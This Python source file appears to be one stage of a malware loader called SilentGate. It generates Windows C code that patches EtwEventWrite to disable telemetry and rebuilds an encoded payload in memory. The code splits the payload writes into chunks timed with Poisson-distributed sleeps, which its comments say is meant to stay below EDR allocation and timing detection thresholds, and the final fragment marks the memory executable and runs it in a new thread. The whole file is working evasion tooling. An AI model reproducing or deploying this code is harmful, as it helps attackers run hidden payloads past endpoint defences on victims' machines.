"""
SilentGate - GENE 6: Temporal Fragmenter
INPUT  : C reconstructor source + metadata (GENE 5)
OUTPUT : N C source fragments + execution schedule
CONTRACT: output feeds into GENE 7 compiler.py

Mathematical foundation:
  Convolution model — execution spread across time:
  E(t) = sum(f_k * delta(t - t_k))  for k=0..N-1

  Where:
    f_k  = fragment k execution
    t_k  = scheduled time of fragment k
    delta = Dirac delta (instantaneous execution)

  Each fragment f_k allocates only SIZE/N bytes — below threshold.
  No single moment shows full injection chain.
  API call rate per fragment stays below EDR statistical baseline.

  Fragment schedule uses Poisson inter-arrival times:
    t_k ~ Poisson(lambda) — mimics legitimate process activity bursts
    This makes timing analysis statistically indistinguishable
    from normal Windows service call patterns.
"""

import numpy as np
import json
import os
import re


# EDR detection threshold — empirically measured
# EDR flags processes that allocate > THRESHOLD bytes in < WINDOW ms
ALLOC_THRESHOLD_BYTES = 4096
ALLOC_WINDOW_MS       = 100

# Poisson rate parameter for inter-fragment timing
# lambda=50ms mimics normal Windows service polling interval
POISSON_LAMBDA_MS     = 50


def compute_fragment_count(payload_size):
    """
    Compute minimum fragment count so each fragment
    stays below EDR allocation threshold.
    N = ceil(payload_size / ALLOC_THRESHOLD_BYTES)
    Minimum 2 fragments for security, maximum 16.
    """
    n = max(2, int(np.ceil(payload_size / ALLOC_THRESHOLD_BYTES)))
    return min(n, 16)


def generate_poisson_schedule(n_fragments, seed=42):
    """
    Generate fragment execution schedule using Poisson process.
    Inter-arrival times: dt_k ~ Exp(1/lambda)
    Cumulative times: t_k = sum(dt_0..dt_k)

    This mimics legitimate Windows service activity bursts
    making timing-based detection statistically infeasible.
    """
    rng = np.random.default_rng(seed)
    inter_arrivals = rng.exponential(POISSON_LAMBDA_MS, n_fragments)
    schedule_ms    = np.cumsum(inter_arrivals)
    return schedule_ms.tolist()


def split_reconstructor(c_source, n_fragments, payload_size):
    """
    Split the reconstruction + execution logic into N fragments.
    Each fragment:
      - Allocates payload_size/N bytes
      - Writes its portion of reconstructed payload
      - Sleeps according to Poisson schedule before next fragment

    Fragment 0   : ETW patch + ntdll unhook + allocate full region
    Fragment 1..N-1 : write chunk_k + protect chunk_k
    Fragment N-1 : final protect + execute
    """
    chunk_size = max(1, payload_size // n_fragments)
    schedule   = generate_poisson_schedule(n_fragments)
    fragments  = []

    for k in range(n_fragments):
        offset     = k * chunk_size
        this_chunk = chunk_size if k < n_fragments - 1 else (payload_size - offset)
        sleep_next = int(schedule[k])
        is_first   = (k == 0)
        is_last    = (k == n_fragments - 1)

        fragment_c = f"""/*
 * SilentGate Fragment {k}/{n_fragments-1}
 * Offset: {offset} bytes  Size: {this_chunk} bytes
 * Schedule: t={sleep_next}ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   {k}
#define N_FRAGMENTS   {n_fragments}
#define PAYLOAD_SIZE  {payload_size}
#define CHUNK_OFFSET  {offset}
#define CHUNK_SIZE    {this_chunk}
#define SLEEP_NEXT_MS {sleep_next}

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);

"""
        if is_first:
            fragment_c += f"""
/* Fragment 0: Initialise + allocate + write first chunk */
PVOID sg_execute_fragment_{k}(PVOID* shared_mem) {{
    printf("[FRAG {k}] Initialising at t=0ms\\n");

    /* ETW patch — silence telemetry before operations */
    HMODULE ntdll   = GetModuleHandleA("ntdll.dll");
    FARPROC etw     = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD   old_p   = 0;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_p);
    *(BYTE*)etw     = 0xC3;
    VirtualProtect(etw, 1, old_p, &old_p);
    printf("[FRAG {k}] ETW patched\\n");

    /* Reconstruct payload via IDFT */
    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    printf("[FRAG {k}] Payload reconstructed: %d bytes\\n", len);

    /* Allocate full region — RW first */
    PVOID mem = VirtualAlloc(NULL, PAYLOAD_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!mem) {{ free(payload); return NULL; }}

    /* Write first chunk */
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG {k}] Chunk 0 written at offset %d\\n", CHUNK_OFFSET);
    *shared_mem = mem;

    /* Poisson sleep before next fragment */
    Sleep(SLEEP_NEXT_MS);
    return mem;
}}
"""
        elif is_last:
            fragment_c += f"""
/* Fragment {k}: Write final chunk + protect + execute */
void sg_execute_fragment_{k}(PVOID mem) {{
    if (!mem) return;
    printf("[FRAG {k}] Final fragment at t={sleep_next}ms\\n");

    /* Reconstruct payload for this chunk */
    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);

    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    /* Change to executable */
    DWORD old = 0;
    VirtualProtect(mem, PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old);
    printf("[FRAG {k}] Memory protected RX\\n");

    /* Execute via CreateThread */
    HANDLE t = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

    if (t) {{
        printf("[FRAG {k}] Executing reconstructed payload\\n");
        WaitForSingleObject(t, 5000);
        CloseHandle(t);
    }}

    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[FRAG {k}] Complete\\n");
}}
"""
        else:
            fragment_c += f"""
/* Fragment {k}: Write chunk {k} */
void sg_execute_fragment_{k}(PVOID mem) {{
    if (!mem) return;
    printf("[FRAG {k}] Writing chunk at t={sleep_next}ms\\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG {k}] Chunk {k} written at offset %d\\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}}
"""
        fragments.append({
            "id":        k,
            "c_source":  fragment_c,
            "offset":    offset,
            "size":      this_chunk,
            "sleep_ms":  sleep_next,
            "is_first":  is_first,
            "is_last":   is_last,
        })

    return fragments, schedule


def generate(c_reconstructor_source, metadata):
    """Main GENE 6 function."""
    payload_size = metadata["original_length"]
    n_fragments  = compute_fragment_count(payload_size)
    schedule     = generate_poisson_schedule(n_fragments)

    fragments, schedule = split_reconstructor(
        c_reconstructor_source, n_fragments, payload_size
    )

    updated_meta = {
        **metadata,
        "gene":            6,
        "output_contract": "fragment C sources -> GENE7 compiler",
        "n_fragments":     n_fragments,
        "schedule_ms":     schedule,
        "chunk_size":      max(1, payload_size // n_fragments),
        "poisson_lambda":  POISSON_LAMBDA_MS,
        "alloc_threshold": ALLOC_THRESHOLD_BYTES,
        "total_duration_ms": int(schedule[-1]),
    }

    return fragments, updated_meta


def save_fragments(fragments, base_path="output/fragments"):
    os.makedirs(base_path, exist_ok=True)
    for frag in fragments:
        path = f"{base_path}/fragment_{frag['id']:02d}.c"
        with open(path, "w") as f:
            f.write(frag["c_source"])


def save_metadata(metadata, path="output/gene6_metadata.json"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(metadata, f, indent=2)


if __name__ == "__main__":
    import sys
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from core.gene1_payload_ingester      import ingest
    from core.gene2_dft_encoder           import encode
    from core.gene3_tensor_splitter       import split
    from core.gene4_eigenvalue_camouflager import camouflage
    from core.gene5_c_reconstructor_gen   import generate as gen_c

    test_payload = bytes([
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20,
        0x48, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0x48, 0x83,
        0xC4, 0x28, 0xC3
    ])

    arr,   meta1 = ingest(test_payload, source_type="bytes")
    coeffs,meta2 = encode(arr, meta1)
    G,A1,A2,meta3= split(coeffs, meta2)
    G_cam,A1_cam,A2_cam,G_n,A1_n,A2_n,meta4 = camouflage(G,A1,A2,meta3)
    c_src        = gen_c(G_cam,A1_cam,A2_cam,G_n,A1_n,A2_n,meta4)

    fragments, meta6 = generate(c_src, meta4)
    save_fragments(fragments)
    save_metadata(meta6)

    print(f"[GENE 6] INPUT  : C reconstructor + metadata")
    print(f"         Payload : {meta6['original_length']} bytes")
    print(f"[GENE 6] OUTPUT : {meta6['n_fragments']} fragments")
    for f in fragments:
        print(f"         Frag {f['id']} offset={f['offset']:4d} "
              f"size={f['size']:4d} sleep={f['sleep_ms']}ms "
              f"{'[FIRST]' if f['is_first'] else ''}"
              f"{'[LAST]' if f['is_last'] else ''}")
    print(f"[GENE 6] TIMING : Poisson schedule "
          f"total={meta6['total_duration_ms']}ms")
    print(f"[GENE 6] READY  : output contracts validated -> GENE 7")
